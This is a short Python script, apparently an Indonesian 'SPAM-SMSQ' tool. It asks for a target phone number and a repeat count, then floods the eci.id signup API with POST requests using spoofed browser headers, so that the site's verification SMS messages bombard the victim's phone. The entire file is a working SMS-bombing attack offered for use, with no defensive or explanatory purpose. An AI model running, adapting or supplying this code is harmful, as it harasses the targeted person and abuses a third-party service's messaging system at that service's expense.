import requests,json,os

k = 0
os.system("clear")
print("SPAM-SMSQ ( HRCXXII )")
nomer = input("Masukan Nomer Target > ")
jumlah = int(input("Masukan Jumlah Spam > "))
headers = {
"Host": "eci.id",
"Connection": "keep-alive",
"Content-Length": "40",
"Accept": "application/json, text/plain, */*",
"User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
"Content-Type": "application/json",
"Origin": "https://eci.id",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://eci.id/verification?step=1&phone= ",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,fa-IR;q=0.6,fa;q=0.5,ar-AE;q=0.4,ar;q=0.3,en-US;q=0.2"}
data = json.dumps({"identity":"0"+nomer})
for i in range(jumlah):
  k += 1
  pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text
  if "success" in pos:
    print("Spam Sms Berhasil =",k)
  else:
    print("Spam Sms Gagal =",k)